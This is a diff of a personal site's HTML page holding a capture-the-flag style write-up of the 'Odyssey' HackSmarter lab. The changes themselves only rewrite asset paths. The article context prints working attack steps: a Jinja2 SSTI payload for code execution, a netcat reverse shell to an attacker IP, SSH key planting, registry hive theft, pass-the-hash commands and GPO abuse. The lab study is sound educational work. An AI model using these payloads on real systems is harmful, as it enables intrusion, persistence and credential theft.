@@ -1,12 +1,12 @@
-<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="A multi-stage penetration testing lab covering Jinja2 SSTI, Linux post-exploitation, credential discovery, Windows Backup Operators abuse, Pass-the-Hash, Active Directory enumeration, and GPO abuse."><meta name="color-scheme" content="dark"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Odyssey - HackSmarter | Samuel Oblika</title><link rel="stylesheet" href="/Website-Portofolio2/_astro/global.DQN7j8JH.css"></head> <body>  <header class="site-header"> <div class="container nav-wrap"> <a class="brand" href="/Website-Portofolio2/" aria-label="Samuel Oblika home"> <span class="brand-mark">SO</span> <span class="brand-copy"> <strong>Samuel Oblika</strong> <small>Offensive Security</small> </span> </a> <nav aria-label="Primary navigation"> <a class href="/Website-Portofolio2/">
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="A multi-stage penetration testing lab covering Jinja2 SSTI, Linux post-exploitation, credential discovery, Windows Backup Operators abuse, Pass-the-Hash, Active Directory enumeration, and GPO abuse."><meta name="color-scheme" content="dark"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Odyssey - HackSmarter | Samuel Oblika</title><link rel="stylesheet" href="/_astro/global.DQN7j8JH.css"></head> <body>  <header class="site-header"> <div class="container nav-wrap"> <a class="brand" href="/" aria-label="Samuel Oblika home"> <span class="brand-mark">SO</span> <span class="brand-copy"> <strong>Samuel Oblika</strong> <small>Offensive Security</small> </span> </a> <nav aria-label="Primary navigation"> <a class href="/">
 Home
-</a> <a class="active" href="/Website-Portofolio2/writeups/">
+</a> <a class="active" href="/writeups/">
 Writeups
-</a> <a class href="/Website-Portofolio2/about/">
+</a> <a class href="/about/">
 About
-</a> <a class href="/Website-Portofolio2/contact/">
+</a> <a class href="/contact/">
 Contact
-</a> </nav> </div> </header> <main class="article-shell container"> <article class="article"> <header> <a class="back-link" href="/Website-Portofolio2/writeups/">Back to writeups</a> <p class="overline">Active Directory / HackSmarter</p> <h1>Odyssey - HackSmarter</h1> <p class="article-description">A multi-stage penetration testing lab covering Jinja2 SSTI, Linux post-exploitation, credential discovery, Windows Backup Operators abuse, Pass-the-Hash, Active Directory enumeration, and GPO abuse.</p> <div class="article-meta"><span>2026-08-12</span><span>Advanced</span><span>8 min read</span></div> <div class="tags"><span class="tag">HackSmarter</span><span class="tag">SSTI</span><span class="tag">Jinja2</span><span class="tag">Linux</span><span class="tag">Windows</span><span class="tag">Backup Operators</span><span class="tag">Pass-the-Hash</span><span class="tag">Active Directory</span><span class="tag">BloodHound</span><span class="tag">bloodyAD</span><span class="tag">GPO</span></div> </header> <div class="prose"><blockquote>
+</a> </nav> </div> </header> <main class="article-shell container"> <article class="article"> <header> <a class="back-link" href="/writeups/">Back to writeups</a> <p class="overline">Active Directory / HackSmarter</p> <h1>Odyssey - HackSmarter</h1> <p class="article-description">A multi-stage penetration testing lab covering Jinja2 SSTI, Linux post-exploitation, credential discovery, Windows Backup Operators abuse, Pass-the-Hash, Active Directory enumeration, and GPO abuse.</p> <div class="article-meta"><span>2026-08-12</span><span>Advanced</span><span>8 min read</span></div> <div class="tags"><span class="tag">HackSmarter</span><span class="tag">SSTI</span><span class="tag">Jinja2</span><span class="tag">Linux</span><span class="tag">Windows</span><span class="tag">Backup Operators</span><span class="tag">Pass-the-Hash</span><span class="tag">Active Directory</span><span class="tag">BloodHound</span><span class="tag">bloodyAD</span><span class="tag">GPO</span></div> </header> <div class="prose"><blockquote>
 <p><strong>Note:</strong> <strong>Disclaimer:</strong> This write-up documents techniques performed inside an authorized HackSmarter lab environment for educational purposes. The techniques described here should only be used against systems you own or have explicit permission to test.</p>
 </blockquote>
 <h1 id="scope--targets">Scope &#x26; Targets</h1>
@@ -73,7 +73,7 @@ Contact
 <h2 id="3-web-application-enumeration">3. Web Application Enumeration</h2>
 <p>Visiting: <code>http://10.1.35.240:5000</code> reveals the <strong>Odyssey Portal</strong>.</p>
 <p>The application allows us to submit template-like input.</p>
-<p><img alt="Odyssey lab screenshot 1" loading="lazy" decoding="async" width="274" height="142" src="/Website-Portofolio2/_astro/1.%20SSTI%20Syntax.qmqmGHoP_2k3gwp.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 1" loading="lazy" decoding="async" width="274" height="142" src="/_astro/1.%20SSTI%20Syntax.qmqmGHoP_Z2jC7wm.webp" srcset=""></p>
 <p>Whenever user-controlled input appears to be processed dynamically by a server-side template engine, several attack classes are worth considering.</p>
 <p>Two immediate possibilities are:</p>
 <ul>
@@ -85,7 +85,7 @@ Contact
 <h2 id="4-server-side-template-injection">4. Server-Side Template Injection</h2>
 <p>We test a mathematical syntax like <code>{{7*7}}</code> and see that it is vulnerable.</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">{{7*7}}</span></span></code></pre>
-<p><img alt="Odyssey lab screenshot 2" loading="lazy" decoding="async" width="647" height="403" src="/Website-Portofolio2/_astro/2.%20Temp-input.Dzshc4n7_ZXz7Qu.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 2" loading="lazy" decoding="async" width="647" height="403" src="/_astro/2.%20Temp-input.Dzshc4n7_jYL90.webp" srcset=""></p>
 <p>Instead of displaying the expression literally, the application evaluates it.</p>
 <p>This confirms <strong>Server-Side Template Injection</strong></p>
 <h3 id="identifying-the-template-engine">Identifying the Template Engine</h3>
@@ -95,7 +95,7 @@ Contact
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">49</span><span style="color:#E1E4E8">       -</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> commonly</span><span style="color:#9ECBFF"> associated</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> Twig</span><span style="color:#9ECBFF"> behavior</span></span>
 <span class="line"><span style="color:#B392F0">7777777</span><span style="color:#E1E4E8">  -</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> commonly</span><span style="color:#9ECBFF"> associated</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> Jinja2</span><span style="color:#9ECBFF"> behavior</span></span></code></pre>
 <p>The application returns: <code>7777777</code></p>
-<p><img alt="Odyssey lab screenshot 3" loading="lazy" decoding="async" width="284" height="150" src="/Website-Portofolio2/_astro/3.%20SSTI%20Inject.DQHs5go__Z1DEnDM.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 3" loading="lazy" decoding="async" width="284" height="150" src="/_astro/3.%20SSTI%20Inject.DQHs5go__Z1zgkvB.webp" srcset=""></p>
 <p>Combined with the fact that the server is running Python/Werkzeug, this strongly indicates that the application uses <strong>Jinja2</strong>.</p>
 <p>Now the important question becomes:</p>
 <blockquote>
@@ -105,12 +105,12 @@ Contact
 <h2 id="5-ssti---remote-code-execution">5. SSTI -> Remote Code Execution</h2>
 <p>After identifying Jinja2, I tested whether Python objects accessible through the template context could reach operating-system functionality.</p>
 <p><strong>And we found this payload while searching.</strong></p>
-<p><img alt="Odyssey lab screenshot 4" loading="lazy" decoding="async" width="1454" height="319" src="/Website-Portofolio2/_astro/4.%20SSTI-RCE.BIEuRJQI_1aQ4FS.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 4" loading="lazy" decoding="async" width="1454" height="319" src="/_astro/4.%20SSTI-RCE.BIEuRJQI_2to2CN.webp" srcset=""></p>
 <ul>
 <li>The following payload executes the Linux <code>id</code> command:</li>
 </ul>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">{{request.application.</span><span style="color:#79B8FF">__globals__</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__builtins__</span><span style="color:#E1E4E8">.__import__(</span><span style="color:#9ECBFF">'os'</span><span style="color:#E1E4E8">).popen(</span><span style="color:#9ECBFF">'id'</span><span style="color:#E1E4E8">).read()}}</span></span></code></pre>
-<p><img alt="Odyssey lab screenshot 5" loading="lazy" decoding="async" width="515" height="149" src="/Website-Portofolio2/_astro/5.%20SSTI%20-%20ID.CjJ69apF_nMWOJ.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 5" loading="lazy" decoding="async" width="515" height="149" src="/_astro/5.%20SSTI%20-%20ID.CjJ69apF_1BxSFM.webp" srcset=""></p>
 <p>We now have:</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SSTI ->Python object access -> OS command execution</span></span></code></pre>
 <p>This confirms <strong>Remote Code Execution (RCE)</strong>.</p>
@@ -119,19 +119,19 @@ Contact
 <p>With command execution available, the next step is obtaining an interactive shell.</p>
 <p>I started a listener on my attacking machine and used the SSTI vulnerability to execute a BusyBox Netcat reverse shell:</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">{{request.application.</span><span style="color:#79B8FF">__globals__</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__builtins__</span><span style="color:#E1E4E8">.__import__(</span><span style="color:#9ECBFF">'os'</span><span style="color:#E1E4E8">).popen(</span><span style="color:#9ECBFF">'busybox nc 10.200.75.51 4444 -e /bin/sh'</span><span style="color:#E1E4E8">).read()}}</span></span></code></pre>
-<p><img alt="Odyssey lab screenshot 6" loading="lazy" decoding="async" width="1405" height="632" src="/Website-Portofolio2/_astro/6.%20RevShell.BzNHKpah_PLamY.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 6" loading="lazy" decoding="async" width="1405" height="632" src="/_astro/6.%20RevShell.BzNHKpah_GLWKz.webp" srcset=""></p>
 <p>After the payload executes, the server connects back to our listener.</p>
 <p>We now have our first foothold on <strong>Web-01</strong>.</p>
 <hr>
 <h2 id="7-web-01-initial-enumeration">7. Web-01 Initial Enumeration</h2>
 <p>After obtaining access, I identified the current user:</p>
-<p><img alt="Odyssey lab screenshot 7" loading="lazy" decoding="async" width="530" height="112" src="/Website-Portofolio2/_astro/7.%20ghill_sa.qmmg2D5k_Z4WEKr.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 7" loading="lazy" decoding="async" width="530" height="112" src="/_astro/7.%20ghill_sa.qmmg2D5k_by9Vc.webp" srcset=""></p>
 <p>User :<code>ghill_sa</code></p>
 <ol>
 <li>From the shell history, we can see that the user had previously worked with SSH keys.</li>
 <li>Most importantly, I discovered an SSH private key: <code>~/.ssh/id_ed25519</code></li>
 </ol>
-<p><img alt="Odyssey lab screenshot 8" loading="lazy" decoding="async" width="583" height="471" src="/Website-Portofolio2/_astro/8.%20ssh.DI20wOiO_Z1VmVQ5.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 8" loading="lazy" decoding="async" width="583" height="471" src="/_astro/8.%20ssh.DI20wOiO_ZcSl1g.webp" srcset=""></p>
 <p>Retrieving SSH key for <code>ghill_sa</code> from  <code>id_ed25519</code> file</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FDAEB7;font-style:italic">----</span><span style="color:#F97583">-</span><span style="color:#79B8FF">BEGIN</span><span style="color:#79B8FF"> OPENSSH</span><span style="color:#79B8FF"> PRIVATE</span><span style="color:#79B8FF"> KEY</span><span style="color:#FDAEB7;font-style:italic">----</span><span style="color:#F97583">-</span></span>
 <span class="line"><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">REDACTED</span><span style="color:#E1E4E8">]</span></span>
@@ -160,7 +160,7 @@ Contact
 </blockquote>
 <p>Using the existing SSTI/RCE , I appended my public key to: <code>/home/ghill_sa/.ssh/authorized_keys</code></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">{{request.application.__globals__.__builtins__.__import__('os').popen('echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMvg4nET4xWI0e0MOLrwF5z5uvbniaRRfd/KvbR//S48 kali@kali" >> /home/ghill_sa/.ssh/authorized_keys').read()}}</span></span></code></pre>
-<p><img alt="Odyssey lab screenshot 9" loading="lazy" decoding="async" width="624" height="137" src="/Website-Portofolio2/_astro/9.%20keys.BRtbA5Yv_1pHld4.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 9" loading="lazy" decoding="async" width="624" height="137" src="/_astro/9.%20keys.BRtbA5Yv_gyLCe.webp" srcset=""></p>
 <h4 id="conceptually">Conceptually</h4>
 <p><code>echo "ATTACKER_PUBLIC_KEY" >> /home/ghill_sa/.ssh/authorized_keys</code></p>
 <p>Now SSH authentication works because:</p>
@@ -175,11 +175,11 @@ Contact
 <span class="line"><span>Access Granted</span></span></code></pre>
 <p>This gives us a much more stable shell than the original reverse shell.</p>
 <p>After we try to connect with SSH server with use our private key and  Web-01 has our Pub_key and will let us connect.</p>
-<p><img alt="Odyssey lab screenshot 10" loading="lazy" decoding="async" width="619" height="512" src="/Website-Portofolio2/_astro/10%20keys.Ck8tC85R_ZNsu05.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 10" loading="lazy" decoding="async" width="619" height="512" src="/_astro/10%20keys.Ck8tC85R_1vVfHT.webp" srcset=""></p>
 <hr>
 <h2 id="9-web-01-privilege-escalation">9. Web-01 Privilege Escalation</h2>
 <p>Looking at <code>.bash_history</code>, the user was doing a lot of SSH stuff</p>
-<p><img alt="Odyssey lab screenshot 11" loading="lazy" decoding="async" width="861" height="455" src="/Website-Portofolio2/_astro/11.%20history.CVUjzQwb_ZGkmdI.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 11" loading="lazy" decoding="async" width="861" height="455" src="/_astro/11.%20history.CVUjzQwb_Z2ul1Kz.webp" srcset=""></p>
 <p>The private SSH key discovered earlier did not authenticate as <code>ghill_sa</code>.</p>
 <p>But that does not mean the key is useless.</p>
 <p><strong>Since we see that this key has been used somewhere-though we do not know where-we will use it for every user in the system, Or maybe work in Windows Machine ???</strong></p>
@@ -193,8 +193,8 @@ Contact
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">┌──(global㉿kali</span><span style="color:#E1E4E8">)-[~/Desktop]</span></span>
 <span class="line"><span style="color:#B392F0">└─$</span><span style="color:#9ECBFF"> ssh</span><span style="color:#9ECBFF"> root@10.1.35.240</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> ghill_sa_ssh</span></span></code></pre>
 <p>Getting root access to this host with this key</p>
-<p><img alt="Odyssey lab screenshot 12" loading="lazy" decoding="async" width="815" height="309" src="/Website-Portofolio2/_astro/12.%20root.CzND4AXt_ZBvd3s.webp" srcset=""></p>
-<p><img alt="Odyssey lab screenshot 13" loading="lazy" decoding="async" width="554" height="214" src="/Website-Portofolio2/_astro/13.%20bash_history.M4iIusyL_Z1ObvKJ.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 12" loading="lazy" decoding="async" width="815" height="309" src="/_astro/12.%20root.CzND4AXt_Z1f5TFR.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 13" loading="lazy" decoding="async" width="554" height="214" src="/_astro/13.%20bash_history.M4iIusyL_1WBoiU.webp" srcset=""></p>
 <p>User Flag : [REDACTED FLAG]</p>
 <hr>
 <h2 id="10-post-exploitation-on-web-01">10. Post-Exploitation on Web-01</h2>
@@ -206,14 +206,14 @@ Contact
 <p>I started automated enumeration with LinPEAS while simultaneously performing manual enumeration.</p>
 <p>This is useful because automated tools can miss contextual information that becomes obvious when manually reviewing command history and configuration files.</p>
 <p><strong>While manually checking things and waiting for LinPEAS to finish, we notice that the <code>.bash_history</code> file is very large, implying it contains a lot of commands.</strong></p>
-<p><img alt="Odyssey lab screenshot 14" loading="lazy" decoding="async" width="589" height="119" src="/Website-Portofolio2/_astro/14.%20update.conf.D7Ji8Uf-_23ovEB.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 14" loading="lazy" decoding="async" width="589" height="119" src="/_astro/14.%20update.conf.D7Ji8Uf-_2p2HYz.webp" srcset=""></p>
 <p>The <code>.bash_history</code> file contained references to:</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /etc/crontab</span><span style="color:#E1E4E8"> </span></span>
 <span class="line"><span style="color:#B392F0">crontab</span><span style="color:#E1E4E8"> </span></span>
 <span class="line"><span style="color:#B392F0">crontab</span><span style="color:#79B8FF"> -e</span></span>
 <span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> update.conf</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -ia</span><span style="color:#9ECBFF"> ghill_sa</span><span style="color:#79B8FF"> -B</span><span style="color:#79B8FF"> 5</span><span style="color:#79B8FF"> -A</span><span style="color:#79B8FF"> 5</span></span></code></pre>
 <p>That makes <code>update.conf</code> worth investigating.</p>
-<p><img alt="Odyssey lab screenshot 15" loading="lazy" decoding="async" width="1579" height="636" src="/Website-Portofolio2/_astro/15.%20remina.CbGujBx-_ZMJAjn.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 15" loading="lazy" decoding="async" width="1579" height="636" src="/_astro/15.%20remina.CbGujBx-_qIfKA.webp" srcset=""></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">root@ip-10-1-35-240:~#</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> /etc/update.conf</span></span>
 <span class="line"></span>
 <span class="line"><span style="color:#E1E4E8">[auth]</span></span>
@@ -254,12 +254,12 @@ Contact
 <p><strong>Note:</strong> <strong>Interactive GUI access is noisy and would normally be used selectively during a stealth-sensitive engagement. In this authorized lab, it provided a convenient way to continue workstation enumeration.</strong></p>
 </blockquote>
 <p><strong>We connect using <code>Remmina</code>.</strong></p>
-<p><img alt="Odyssey lab screenshot 16" loading="lazy" decoding="async" width="965" height="596" src="/Website-Portofolio2/_astro/16.%20sahre%20folder.BPQ1jdwo_dCN2T.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 16" loading="lazy" decoding="async" width="965" height="596" src="/_astro/16.%20sahre%20folder.BPQ1jdwo_eX4fz.webp" srcset=""></p>
 <p>Full GUI Access</p>
 <hr>
 <h2 id="13-workstation-enumeration">13. Workstation Enumeration</h2>
 <p>Inside WKST-01, I discovered a <code>shared</code> directory containing several files with credentials for different internal services and users.</p>
-<p><img alt="Odyssey lab screenshot 17" loading="lazy" decoding="async" width="794" height="283" src="/Website-Portofolio2/_astro/17.%20Credential.DM3cO_-r_ZbpdK5.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 17" loading="lazy" decoding="async" width="794" height="283" src="/_astro/17.%20Credential.DM3cO_-r_2rcwo9.webp" srcset=""></p>
 <p>Examples included accounts associated with:</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Finance</span></span>
 <span class="line"><span>HR</span></span>
@@ -272,7 +272,7 @@ Contact
 <span class="line"><span>Support</span></span>
 <span class="line"><span>Training</span></span></code></pre>
 <p>The shared directory exposed several credentials.</p>
-<p><img alt="Odyssey lab screenshot 18" loading="lazy" decoding="async" width="627" height="179" src="/Website-Portofolio2/_astro/18.%20SeBackUpPrivilege.D-UW7-K9_Z2nCTfF.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 18" loading="lazy" decoding="async" width="627" height="179" src="/_astro/18.%20SeBackUpPrivilege.D-UW7-K9_OLNrD.webp" srcset=""></p>
 <p>This is a significant finding because shared folders containing plaintext credentials can create a direct path for lateral movement.</p>
 <p>However, immediately password-spraying all discovered credentials would be risky.</p>
 <p>In an Active Directory environment, aggressive authentication attempts can trigger:</p>
@@ -317,7 +317,7 @@ Contact
 <p><code>Backup Operators</code> is particularly interesting.</p>
 <p>Members of this group can receive powerful privileges related to backing up and restoring files.</p>
 <p>Checking privileges revealed:</p>
-<p><img alt="Odyssey lab screenshot 19" loading="lazy" decoding="async" width="649" height="560" src="/Website-Portofolio2/_astro/19.%20SMBShare.9p6FNMaK_29CdVP.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 19" loading="lazy" decoding="async" width="649" height="560" src="/_astro/19.%20SMBShare.9p6FNMaK_Z1EEUg3.webp" srcset=""></p>
 <p>Although <code>SeBackupPrivilege</code> initially appeared disabled, the account’s group membership still gave us a potential path to sensitive system files.</p>
 <p>Our target becomes:</p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SAM</span></span>
@@ -355,7 +355,7 @@ Contact
 <p><strong>We create an SMB server on our Linux system.</strong></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">impacket-smbserver</span><span style="color:#79B8FF"> -smb2support</span><span style="color:#79B8FF"> -username</span><span style="color:#9ECBFF"> test</span><span style="color:#79B8FF"> -password</span><span style="color:#9ECBFF"> test</span><span style="color:#9ECBFF"> MyServer</span><span style="color:#9ECBFF"> .</span></span></code></pre>
 <p><strong>From WKST-01, I access our SMB folder and transfer the files.</strong></p>
-<p><img alt="Odyssey lab screenshot 20" loading="lazy" decoding="async" width="671" height="237" src="/Website-Portofolio2/_astro/20.%20Restricted.dGuOvXqr_JOMXW.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 20" loading="lazy" decoding="async" width="671" height="237" src="/_astro/20.%20Restricted.dGuOvXqr_2hO0zK.webp" srcset=""></p>
 <p>We now have: <code>SAM.save</code> and <code>SYSTEM.save</code> on our attacking machine.</p>
 <hr>
 <h2 id="18-dumping-local-password-hashes">18. Dumping Local Password Hashes</h2>
@@ -404,7 +404,7 @@ Contact
 <p>This technique is known as: <code>Pass-the-Hash (PtH).</code></p>
 <p><strong>When we try to connect, we get restricted.</strong></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">xfreerdp3</span><span style="color:#9ECBFF"> /v:10.1.40.34</span><span style="color:#9ECBFF"> /u:'Administrator'</span><span style="color:#9ECBFF"> /pth:'d5cad8a9782b2879bf316f56936f1e36'</span></span></code></pre>
-<p><img alt="Odyssey lab screenshot 21" loading="lazy" decoding="async" width="357" height="204" src="/Website-Portofolio2/_astro/21.%20EDR.eRaxUPuc_ZpIac1.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 21" loading="lazy" decoding="async" width="357" height="204" src="/_astro/21.%20EDR.eRaxUPuc_ZAvafW.webp" srcset=""></p>
 <p><strong>I therefore tested the hash over SMB with NetExec and confirmed that it was valid.</strong></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nxc</span><span style="color:#9ECBFF"> smb</span><span style="color:#79B8FF"> 10.1.40.34</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> 'Administrator'</span><span style="color:#79B8FF"> -H</span><span style="color:#9ECBFF"> 'd5cad8a9782b2879bf316f56936f1e36'</span><span style="color:#79B8FF"> --local-auth</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> whoami</span><span style="color:#79B8FF"> --smb-timeout</span><span style="color:#79B8FF"> 30</span></span>
 <span class="line"><span style="color:#B392F0">SMB</span><span style="color:#79B8FF">         10.1.40.34</span><span style="color:#79B8FF">      445</span><span style="color:#9ECBFF">    EC2AMAZ-NS87CNK</span><span style="color:#E1E4E8">  [*] Windows 11 / Server 2025 Build 26100 x64 (</span><span style="color:#B392F0">name:EC2AMAZ-NS87CNK</span><span style="color:#E1E4E8">) (</span><span style="color:#B392F0">domain:EC2AMAZ-NS87CNK</span><span style="color:#E1E4E8">) (</span><span style="color:#B392F0">signing:True</span><span style="color:#E1E4E8">) (</span><span style="color:#B392F0">SMBv1:None</span><span style="color:#E1E4E8">)</span></span>
@@ -417,7 +417,7 @@ Contact
 <h2 id="20-adding-our-user-to-administrators">20. Adding Our User to Administrators</h2>
 <p><strong>An initial attempt to add the user to the local Administrators group through remote command execution was blocked in the lab environment.</strong></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nxc</span><span style="color:#9ECBFF"> smb</span><span style="color:#79B8FF"> 10.1.40.34</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> 'Administrator'</span><span style="color:#79B8FF"> -H</span><span style="color:#9ECBFF"> 'd5cad8a9782b2879bf316f56936f1e36'</span><span style="color:#79B8FF"> --local-auth</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> 'net localgroup Administrators ghill_sa /add'</span><span style="color:#79B8FF"> --smb-timeout</span><span style="color:#79B8FF"> 30</span></span></code></pre>
-<p><img alt="Odyssey lab screenshot 22" loading="lazy" decoding="async" width="1032" height="404" src="/Website-Portofolio2/_astro/22.%20GPO.BgpGK2Wl_YrvLQ.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 22" loading="lazy" decoding="async" width="1032" height="404" src="/_astro/22.%20GPO.BgpGK2Wl_ybHSt.webp" srcset=""></p>
 <p><strong>Using <code>impacket-net</code> provided an alternative way to perform the same authorized administrative change.</strong></p>
 <pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">impacket-net</span><span style="color:#9ECBFF"> 'Administrator'@10.1.40.34</span><span style="color:#79B8FF"> -hashes</span><span style="color:#9ECBFF"> ':d5cad8a9782b2879bf316f56936f1e36'</span><span style="color:#9ECBFF"> localgroup</span><span style="color:#79B8FF"> -name</span><span style="color:#9ECBFF"> Administrators</span><span style="color:#79B8FF"> -join</span><span style="color:#9ECBFF"> ghill_sa</span></span>
 <span class="line"></span>
@@ -495,11 +495,11 @@ Contact
 <p>Analyzing the collected Active Directory relationships revealed that <code>bbarkinson</code> had permissions that could be abused against a Group Policy Object.</p>
 <p>At this point, the attack becomes a <strong>GPO abuse</strong> scenario.</p>
 <p><strong>BloodHound recommends using <code>pyGPOAbuse</code> for this abuse.</strong></p>
-<p><img alt="Odyssey lab screenshot 23" loading="lazy" decoding="async" width="1011" height="645" src="/Website-Portofolio2/_astro/24.%20GPOAbuse.DTOowvMv_jHAWn.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 23" loading="lazy" decoding="async" width="1011" height="645" src="/_astro/24.%20GPOAbuse.DTOowvMv_Z1kzVtR.webp" srcset=""></p>
 <hr>
 <h2 id="25-testing-pygpoabuse">25. Testing pyGPOAbuse</h2>
 <p><strong>I then reviewed the required <code>pyGPOAbuse</code> syntax and the GPO identifier discovered through the collected relationship data.</strong></p>
-<p><img alt="Odyssey lab screenshot 24" loading="lazy" decoding="async" width="932" height="565" src="/Website-Portofolio2/_astro/25.%20GPOID.BIKMXvM-_Z2jnqDt.webp" srcset=""></p>
+<p><img alt="Odyssey lab screenshot 24" loading="lazy" decoding="async" width="932" height="565" src="/_astro/25.%20GPOID.BIKMXvM-_ZXp41z.webp" srcset=""></p>
 <ol>
 <li>Obtain the GPO ID from BloodHound</li>
 </ol>
@@ -749,4 +749,4 @@ This confirms that the GPO permissions are exploitable.</p>
 <span class="line"><span>Active Directory Misconfiguration</span></span>
 <span class="line"><span>        =</span></span>
 <span class="line"><span>Domain Compromise</span></span></code></pre>
-<p>That is what made Odyssey such a valuable lab for practicing a real penetration-testing mindset.</p></div> </article> <aside class="toc"><strong>On this page</strong><a class="toc-2" href="#1-web-01-enumeration">1. Web-01 Enumeration</a><a class="toc-3" href="#port-enumeration--service-discovery">Port Enumeration &amp; Service Discovery</a><a class="toc-2" href="#2-ssh-enumeration">2. SSH Enumeration</a><a class="toc-2" href="#3-web-application-enumeration">3. Web Application Enumeration</a><a class="toc-2" href="#4-server-side-template-injection">4. Server-Side Template Injection</a><a class="toc-3" href="#identifying-the-template-engine">Identifying the Template Engine</a><a class="toc-2" href="#5-ssti---remote-code-execution">5. SSTI -&gt; Remote Code Execution</a><a class="toc-2" href="#6-reverse-shell">6. Reverse Shell</a><a class="toc-2" href="#7-web-01-initial-enumeration">7. Web-01 Initial Enumeration</a><a class="toc-2" href="#8-establishing-ssh-access">8. Establishing SSH Access</a><a class="toc-2" href="#9-web-01-privilege-escalation">9. Web-01 Privilege Escalation</a><a class="toc-2" href="#10-post-exploitation-on-web-01">10. Post-Exploitation on Web-01</a><a class="toc-2" href="#11-testing-discovered-credentials">11. Testing Discovered Credentials</a><a class="toc-2" href="#12-wkst-01-initial-access">12. WKST-01 Initial Access</a><a class="toc-3" href="#operational-consideration">Operational Consideration</a><a class="toc-2" href="#13-workstation-enumeration">13. Workstation Enumeration</a><a class="toc-2" href="#14-discovering-backup-operators">14. Discovering Backup Operators</a><a class="toc-2" 